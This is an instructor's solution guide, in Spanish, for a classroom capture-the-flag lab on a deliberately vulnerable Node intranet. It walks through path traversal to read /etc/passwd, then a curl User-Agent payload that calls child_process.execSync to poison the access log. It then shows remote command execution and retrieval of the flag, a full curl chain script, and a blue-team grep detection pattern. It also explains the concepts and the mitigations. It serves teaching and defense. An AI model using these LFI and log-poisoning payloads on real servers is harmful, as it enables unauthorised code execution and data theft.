# SOLUCIÓN — Lab Log Poisoning → RCE (guía del docente)

> ⚠️ **Documento con spoilers.** Contiene la solución completa del reto. No lo
> entregues a los alumnos antes de la actividad.

Objetivo: desde una "intranet" vulnerable, encadenar **lectura de archivos (LFI) →
motor de plantillas inseguro (SSTI) → Log Poisoning → RCE** para ejecutar comandos en el
servidor y leer la flag de la sala.

En los comandos, reemplaza:
- `<HOST>` por tu URL (ej. `http://localhost`, el puerto reenviado del Codespace, o la URL
  `https://xxxx.trycloudflare.com` del túnel).
- `<sala>` por el identificador de la sala del alumno (lo que sale del nombre en el login;
  ej. `Ana Pérez → anaperez`). En los ejemplos usamos `demo`.

La flag esperada para una sala la puedes consultar en el servidor con:
`docker compose exec web getflag <sala>`.

---

## Etapa 1 — Entrar a la intranet
Abre `<HOST>/`, escribe un nombre y entra. Quedas en `<HOST>/?room=demo`. A la derecha,
el "visor" carga páginas con `?page=pages/home.tmpl`. La guía marca **Entra a tu intranet**.

Observa que la página de inicio muestra la **fecha del servidor** y "Acerca de" muestra el
**año**: no son texto fijo, el visor **evalúa expresiones** (pista clave para la Etapa 4).

## Etapa 2 — Lectura de archivos (LFI / path traversal)
El visor incluye el archivo de `?page=` sin validarlo. Apunta a un archivo del sistema:

```
<HOST>/?room=demo&page=/etc/passwd
```

Verás el contenido de `/etc/passwd` → hay **lectura arbitraria de archivos**.
La guía marca **Lee archivos del sistema**.

## Etapa 3 — Leer el log de tu sala
La intranet registra cada visita (con tu `User-Agent`) en `/var/log/lab/<sala>.log`.
Léelo con el mismo LFI:

```
<HOST>/?room=demo&page=/var/log/lab/demo.log
```

Verás tus propias líneas de acceso. La guía marca **Lee el log de tu sala**.

## Etapa 4 — Envenenar el log (payload JS en el User-Agent)
El visor **evalúa expresiones `${...}` como JavaScript del lado del servidor** (SSTI), y el
log guarda tu `User-Agent` **sin sanitizar**. Entonces: envía una petición cuyo `User-Agent`
sea una expresión que ejecute comandos. Desde una terminal:

```bash
curl -A '${require("child_process").execSync(cmd).toString()}' "<HOST>/?room=demo"
```

Esto deja esa expresión guardada como una línea más del log. La guía marca
**Envenena el log**.

> Nota: se usan comillas **simples** en `curl -A '...'` para que la shell no expanda `${...}`;
> el payload debe llegar literal al log.

## Etapa 5 — RCE (ejecutar comandos)
Ahora pídele al visor que **renderice el log** pasándole un comando con `&cmd=`. Al renderizar,
el `${...}` guardado se evalúa y ejecuta `execSync(cmd)` en el servidor:

```
<HOST>/?room=demo&page=/var/log/lab/demo.log&cmd=id
```

En la salida verás algo como `uid=1000(node) gid=1000(node)...` → **RCE conseguido**.
La guía marca **Consigue RCE**. Prueba también `cmd=ls /` o `cmd=whoami`.

## Etapa 6 — Obtener la flag y validarla
La flag se genera con `/usr/local/bin/getflag <sala>`, un binario **ejecutable pero no
legible** (no se puede `cat` ni leer por LFI): hay que **ejecutarlo**, por eso necesitabas el
RCE. Ejecútalo pasando tu sala como comando:

```
<HOST>/?room=demo&page=/var/log/lab/demo.log&cmd=getflag demo
```

Copia el `FLAG{lp_xxxxxxxx}` que aparece, pégalo en **"Envía tu flag"** y pulsa **Validar**.
La guía marca **Obtén la flag y envíala** y muestra "🎉 ¡Flag válida!".

---

## Resumen de la cadena (una sola corrida con curl)
```bash
HOST="http://localhost"; SALA="demo"
# 2) LFI (lectura cruda con raw=1)
curl -s "$HOST/?room=$SALA&page=/etc/passwd&raw=1" | grep root:x:0:0
# 3) leer el log en crudo (ves tu User-Agent)
curl -s "$HOST/?room=$SALA&page=/var/log/lab/$SALA.log&raw=1" | tail -3
# 4) envenenar el log
curl -s -A '${require("child_process").execSync(cmd).toString()}' "$HOST/?room=$SALA" >/dev/null
# 5) RCE (render del log + comando)
curl -s "$HOST/?room=$SALA&page=/var/log/lab/$SALA.log&cmd=id" | grep -o 'uid=[0-9]*([a-z]*)'
# 6) flag
curl -s "$HOST/?room=$SALA&page=/var/log/lab/$SALA.log&cmd=getflag%20$SALA" | grep -o 'FLAG{[^}]*}'
```

> **Novedades de la app:** el visor admite `&raw=1` (lectura cruda sin evaluar) para
> inspeccionar archivos y el log sin disparar el payload; sin `raw` lo renderiza (SSTI). Hay
> un `.env` señuelo y el código es legible por LFI (recon), pero el secreto real vive en el
> binario `getflag` (no legible). La pista del log está escondida en la sección **Soporte TI**.

### Equipo azul
Todas las peticiones quedan en `/var/log/lab/access.log` (incluidos 404). Caza la cadena:
```bash
docker compose exec web grep -Ei "\.\./|/etc/passwd|\$\{|require\(|child_process|execSync" /var/log/lab/*.log
```

## Por qué funciona (conceptos a reforzar)
- **LFI / path traversal:** incluir rutas controladas por el usuario sin validación permite
  leer cualquier archivo que el proceso pueda abrir.
- **Log Poisoning:** si un dato que el atacante controla (aquí el `User-Agent`) se guarda sin
  sanitizar en un archivo que luego el servidor **procesa como código**, el log se vuelve un
  vehículo de ejecución.
- **SSTI / evaluación insegura:** el motor de plantillas casero hace `new Function(...)` sobre
  `${...}`; evaluar entrada no confiable = ejecución de código en el servidor.
- **Mínimo privilegio:** el proceso corre como `node` (no root) y la flag vive tras un binario
  no legible → se evita que un simple LFI (lectura) baste; obliga a RCE real.

## Mitigaciones (cierre de la clase)
- Validar/allow-list de `page` (nunca incluir rutas del usuario; servir solo IDs de página).
- No evaluar plantillas con `eval`/`new Function`; usar un motor seguro con escape por defecto.
- Sanitizar y separar los logs de cualquier ruta de ejecución; tratarlos como datos.
- Principio de mínimo privilegio y segregación de secretos.

## Reiniciar el reto para otra clase
Los logs y las marcas de "resuelto" viven dentro del contenedor:
```bash
docker compose down && docker compose up -d --build
```
